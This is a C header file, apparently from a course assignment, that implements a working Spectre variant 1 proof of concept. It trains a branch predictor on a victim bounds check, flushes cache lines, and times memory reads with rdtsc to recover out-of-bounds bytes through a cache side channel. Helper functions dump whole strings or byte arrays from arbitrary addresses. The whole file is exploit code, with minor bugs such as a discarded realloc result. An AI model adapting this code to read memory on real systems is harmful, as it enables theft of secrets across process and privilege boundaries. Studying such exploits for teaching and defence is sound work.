//
// Created by me on 22.01.2021.
//

#ifndef HW6__SPECTRE_H_
#define HW6__SPECTRE_H_

#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#include <stdbool.h>
#endif

#define MIN_ITERATIONS 1
#define MAX_ITERATIONS 500000
#define BRANCH_TRAINS 32
#define PAGE_SIZE 4096
//#define PAGE_SIZE (1<<20)
#define CUTOFF_TIME 500
#define CACHE_HIT_COEFF 4

FILE *output = NULL;

uint8_t side_effects[256L * PAGE_SIZE] = {0xda}; // Not zero because 0-page
size_t array_size = BRANCH_TRAINS;
uint8_t base_array[BRANCH_TRAINS];

uint8_t victim_function(uint64_t i) {
  if (i < array_size)
    return side_effects[base_array[i] * PAGE_SIZE];
  return 0;
}

uint8_t read_at(uint64_t addr) {
  uint64_t c_sum = 0, c_cnt = 0;
  uint64_t c_i_sum[256] = {0}, c_i_cnt[256] = {0};
  addr -= (uint64_t) &base_array; // address relative to our array
  for (uint64_t t_iter = 0; t_iter < MAX_ITERATIONS; t_iter++) {
    for (size_t i = 0; i < BRANCH_TRAINS; i++) { // training
      victim_function(i);
      _mm_clflush(&array_size);
    }
    _mm_clflush(&array_size);
    _mm_clflush(base_array);
    _mm_clflush(&side_effects[0]);
    victim_function(addr);

    for (size_t i = 0; i < 256; i++) {
      register uint64_t time;
   
      __sync_synchronize(); // Following code has to be executed in correct order, so we synchronize the pipeline
      register uint64_t start = __rdtsc();
      time = side_effects[i * PAGE_SIZE];
      __sync_synchronize();
      time = __rdtsc() - start;
      _mm_clflush(&side_effects[i * PAGE_SIZE]);
      // If the read is abnormally slow we have to start over - got interrupted by the OS.
      if (time > CUTOFF_TIME) {
       continue;
      }
      if (t_iter > MIN_ITERATIONS && c_i_cnt[i]) {
        register uint64_t average = (c_sum - c_i_sum[i]) / (c_cnt - c_i_cnt[i]);
        if (CACHE_HIT_COEFF * time < average) {// faster than else's average - that's a cache hit.
          if (output != NULL) {
            fprintf(output,
                    "%p = %c - page takes %ld cycles to read (average = %lu) (took %lu iterations, %lu reads and %lu cycles)\n",
                    (void *) addr,
                    (char) i,
                    time,
                    average,
                    t_iter,
                    c_cnt,
                    c_sum);
          }
          return i;
        }
      }
      c_sum += time;
      c_cnt++;
      c_i_sum[i] += time;
      c_i_cnt[i]++;
    }
  }
  return 0;
}

uint8_t *read_byte_string_at(uint64_t addr) {
  size_t capacity = 1;
  uint8_t *a = malloc(capacity);
  size_t read = 0;
  do {
    a[read] = read_at(addr + read);
    read++;
    if (read == capacity) {
      capacity *= 2;
      a = realloc(a, capacity);
    }
  } while (a[read - 1]);
  realloc(a, read);
  return a;
}

uint8_t *read_byte_array_at(uint64_t addr, size_t num) {
  uint8_t *a = malloc(num);
  for(size_t offset = 0; offset < num; offset++) {
    a[offset] = read_at(addr + offset);
  }
  return a;
}

#endif //HW6__SPECTRE_H_
